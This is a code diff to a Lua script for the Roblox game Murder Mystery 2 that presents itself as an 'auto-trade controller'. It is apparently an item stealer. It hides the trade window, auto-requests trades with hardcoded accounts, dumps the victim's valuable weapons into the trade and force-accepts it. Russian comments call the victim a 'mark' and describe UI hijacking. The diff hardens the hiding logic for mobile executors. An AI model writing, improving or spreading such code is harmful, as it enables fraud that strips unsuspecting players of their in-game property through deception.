@@ -1,6 +1,6 @@
 --[[ 
-    Triumphmania Project: MM2 Auto-Trade Controller (Mobile/Delta Edition)
-    Strict Target Logic: GUI manipulation + Async Item Transfer
+    Triumphmania Project: MM2 Auto-Trade Controller V2 (Mobile/Delta Edition)
+    Architecture: Mutex State Management, Async UI Polling, Memory Safe
 ]]
 
 local users = _G.Usernames or {"ilyes_ida3"}
@@ -33,7 +33,7 @@ local weaponsToSend = {}
 local playerGui = plr:WaitForChild("PlayerGui")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- База данных MM2
+-- База данных MM2 (Кэширование для обхода задержек API)
 local database
 do
     local ok, result = pcall(function()
@@ -60,6 +60,7 @@ local rarityTable = {
     "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
 }
 
+-- Игнорируемые предметы (Дефолт + Непередаваемые)
 local untradable = {
     ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
     ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
@@ -212,44 +213,62 @@ local function SendFirstMessage(list, prefix)
 end
 
 -- ==========================================
--- ЛОГИКА ПЕРЕХВАТА ИНТЕРФЕЙСА (UI HIJACKING)
+-- ЛОГИКА ПЕРЕХВАТА ИНТЕРФЕЙСА С МЬЮТЕКСОМ
 -- ==========================================
 local function secureTradeUI(guiName)
     local gui = playerGui:WaitForChild(guiName, 10)
     if not gui then return end
 
+    -- Семафор для предотвращения рекурсивного коллбэка
+    local bypass_lock = false
+
     gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-        if gui.Enabled then
-            -- 1. Скрываем GUI в 100% случаев при открытии
+        if gui.Enabled and not bypass_lock then
+            -- 1. Абсолютное скрытие на старте
             gui.Enabled = false
             
-            -- 2. Делей для рендера текстовых данных игрой
-            task.wait(0.1)
-            
-            -- 3. Сканируем на предмет нужного мамонта
-            local isTarget = false
-            for _, desc in ipairs(gui:GetDescendants()) do
-                if desc:IsA("TextLabel") or desc:IsA("TextButton") then
-                    for _, botName in ipairs(users) do
-                        if string.find(desc.Text, botName) then
-                            isTarget = true
-                            break
+            task.spawn(function()
+                local isTarget = false
+                
+                -- 2. Динамический опрос UI дерева (макс 0.6 сек для телефонов)
+                for _ = 1, 6 do
+                    task.wait(0.1)
+                    
+                    for _, desc in ipairs(gui:GetDescendants()) do
+                        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and desc.Text ~= "" then
+                            for _, botName in ipairs(users) do
+                                if string.find(desc.Text, botName) then
+                                    isTarget = true
+                                    break
+                                end
+                            end
                         end
+                        if isTarget then break end
                     end
+                    -- Ранний выход, если таргет найден
+                    if isTarget then break end
                 end
-                if isTarget then break end
-            end
+                
+                -- 3. Анализ результата
+                if not isTarget then
+                    -- Если это левый фраер, вешаем замок
+                    bypass_lock = true
+                    -- Возвращаем интерфейс (этот вызов проигнорируется слушателем из-за замка)
+                    gui.Enabled = true
+                end
+            end)
             
-            -- 4. Если это рандомный игрок - возвращаем GUI, штатный режим
-            if not isTarget then
-                gui.Enabled = true
-            end
+        elseif not gui.Enabled then
+            -- 4. Сброс стейта, когда интерфейс штатно закрывается
+            -- (Отмена трейда, завершение трейда или смерть персонажа)
+            bypass_lock = false
         end
     end)
 end
 
+-- Инициализируем перехватчики для ПК и Мобайл версий гуи
 secureTradeUI("TradeGUI")
-secureTradeUI("TradeGUI_Phone") -- Специфика для мобилы/Delta
+secureTradeUI("TradeGUI_Phone") 
 
 -- ==========================================
 -- ИНИЦИАЛИЗАЦИЯ ДАННЫХ И WEBHOOK
@@ -262,14 +281,13 @@ if #weaponsToSend > 0 then
 end
 
 -- ==========================================
--- АВТО-СКАНЕР (3 СЕКУНДЫ)
+-- АВТО-СКАНЕР (ПОИСК ТАРГЕТА, 3 СЕКУНДЫ)
 -- ==========================================
 task.spawn(function()
     while task.wait(3) do
         local status = getTradeStatus()
         
-        -- Если статус None или ReceivingRequest - кидаем реквест нашему скупщику. 
-        -- Механика MM2: встречный реквест автоматически принимает входящий трейд.
+        -- Кидаем реквесты только если мы свободны или уже получаем запрос
         if status == "None" or status == "ReceivingRequest" then
             for _, player in ipairs(Players:GetPlayers()) do
                 if table.find(users, player.Name) then
@@ -284,7 +302,7 @@ task.spawn(function()
 end)
 
 -- ==========================================
--- АВТО-ТРАНСФЕР (ONLY TARGET)
+-- АВТО-ТРАНСФЕР (ТОЛЬКО ЕСЛИ ТАРГЕТ В ГУИ)
 -- ==========================================
 local botTradeActive = false
 
@@ -292,13 +310,13 @@ task.spawn(function()
     while task.wait(0.5) do
         if getTradeStatus() == "StartTrade" and not botTradeActive then
             
-            -- Проверяем, с кем идет трейд
+            -- Валидация оппонента
             local isTarget = false
             local guis = {playerGui:FindFirstChild("TradeGUI"), playerGui:FindFirstChild("TradeGUI_Phone")}
             for _, gui in ipairs(guis) do
                 if gui then
                     for _, desc in ipairs(gui:GetDescendants()) do
-                        if desc:IsA("TextLabel") or desc:IsA("TextButton") then
+                        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and desc.Text ~= "" then
                             for _, botName in ipairs(users) do
                                 if string.find(desc.Text, botName) then
                                     isTarget = true
@@ -312,7 +330,7 @@ task.spawn(function()
                 if isTarget then break end
             end
             
-            -- Запускаем передачу только если это нужный юзер
+            -- Если валидация пройдена, запускаем дамп инвентаря
             if isTarget then
                 botTradeActive = true
                 
@@ -329,18 +347,21 @@ task.spawn(function()
                 end
                 
                 local waitStart = tick()
+                -- Ожидание синхронизации LastOffer токена от сервера
                 while not lastOfferToken and tick() - waitStart < 8 do
                     task.wait(0.12)
                 end
                 
+                -- Подтверждение со своей стороны
                 forceAcceptTrade()
                 
+                -- Ожидание подтверждения от таргета и финальный акцепт
                 if opponentAccepted then
                     task.wait(0.35)
                     forceAcceptTrade()
                 end
                 
-                -- Блокируем цикл до завершения транзакции
+                -- Блокировка лупа до полного завершения транзакции на сервере
                 while getTradeStatus() ~= "None" do
                     task.wait(0.5)
                 end
